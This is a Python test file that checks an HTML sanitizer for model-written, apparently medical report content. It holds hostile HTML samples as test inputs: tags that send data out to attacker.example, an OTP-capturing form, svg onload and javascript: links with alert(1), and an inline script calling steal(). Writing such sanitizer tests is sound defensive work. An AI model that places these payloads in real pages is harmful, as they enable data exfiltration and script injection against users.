"""sanitize_and_wrap_html: model-written HTML is untrusted."""

import pytest
from bs4 import BeautifulSoup

from generate_insights_txt import BASE_CSS, UNSAFE_TAGS, sanitize_and_wrap_html


def body_of(html: str) -> BeautifulSoup:
    return BeautifulSoup(html, "html.parser").body


# Elements that can hold content; the rest (img, input, ...) are void.
CONTAINERS = ["script", "style", "picture", "video", "audio", "iframe", "object", "form", "svg"]  # fmt: skip


@pytest.mark.parametrize("tag", UNSAFE_TAGS)
def test_unsafe_elements_are_removed(tag):
    body = body_of(sanitize_and_wrap_html(f'<p>kept</p><{tag} title="x">'))

    assert body.find(tag) is None
    assert body.p.get_text() == "kept"


@pytest.mark.parametrize("tag", CONTAINERS)
def test_unsafe_elements_are_removed_with_their_content(tag):
    body = body_of(sanitize_and_wrap_html(f"<p>kept</p><{tag}>payload</{tag}>"))

    assert body.find(tag) is None
    assert "payload" not in body.get_text()


def test_every_container_is_in_the_unsafe_list():
    assert set(CONTAINERS) <= set(UNSAFE_TAGS)


@pytest.mark.parametrize(
    "fragment",
    [
        '<img src="https://attacker.example/x.png?d=patient">',
        '<link rel="stylesheet" href="https://attacker.example/s.css">',
        '<meta http-equiv="refresh" content="0;url=https://attacker.example">',
        '<base href="https://attacker.example/">',
        '<form action="https://attacker.example"><input name="otp"></form>',
        '<svg onload="alert(1)"><circle r="1"/></svg>',
        '<iframe src="https://attacker.example"></iframe>',
        '<video><source src="https://attacker.example/v.mp4"></video>',
    ],
)
def test_nothing_remote_survives(fragment):
    body = body_of(sanitize_and_wrap_html(f"<div>{fragment}</div>"))

    assert "attacker.example" not in str(body)
    assert "alert" not in str(body)


def test_unsafe_elements_nested_in_safe_ones_are_removed():
    body = body_of(
        sanitize_and_wrap_html(
            "<table><tr><td>HbA1c <script>steal()</script>6.1 %</td></tr></table>"
        )
    )

    assert body.find("script") is None
    assert body.td.get_text() == "HbA1c 6.1 %"


@pytest.mark.parametrize("attr", ["onclick", "onmouseover", "OnLoad", "ONERROR"])
def test_event_handlers_are_removed_in_any_case(attr):
    body = body_of(sanitize_and_wrap_html(f'<p {attr}="alert(1)" class="note">x</p>'))

    assert body.p.attrs == {"class": ["note"]}


@pytest.mark.parametrize(
    "href",
    ["javascript:alert(1)", "JavaScript:alert(1)", "  javascript:alert(1)"],
)
def test_javascript_links_are_removed(href):
    body = body_of(sanitize_and_wrap_html(f'<a href="{href}">open</a>'))

    assert "href" not in body.a.attrs
    assert body.a.get_text() == "open"


def test_safe_structure_and_text_are_kept():
    fragment = (
        "<h2>Haematology</h2>"
        '<table class="results"><tr><th>Test</th><th>Value</th></tr>'
        "<tr><td>Haemoglobin</td><td>13.2 g/dL</td></tr></table>"
        "<ul><li>Advice: repeat CBC</li></ul>"
        '<p>See <a href="#remarks">remarks</a> &amp; notes</p>'
    )
    body = body_of(sanitize_and_wrap_html(fragment))

    assert body.h2.get_text() == "Haematology"
    assert body.table["class"] == ["results"]
    assert [td.get_text() for td in body.find_all("td")] == [
        "Haemoglobin",
        "13.2 g/dL",
    ]
    assert body.li.get_text() == "Advice: repeat CBC"
    assert body.a["href"] == "#remarks"
    assert body.p.get_text() == "See remarks & notes"


def test_output_is_a_full_document_with_only_the_base_styles():
    html = sanitize_and_wrap_html("<style>body{background:url(x)}</style><p>x</p>")
    soup = BeautifulSoup(html, "html.parser")

    assert soup.head.find("meta", charset="UTF-8") is not None
    styles = soup.find_all("style")
    assert len(styles) == 1
    assert str(styles[0]) == BASE_CSS.strip()
    assert "url(" not in html
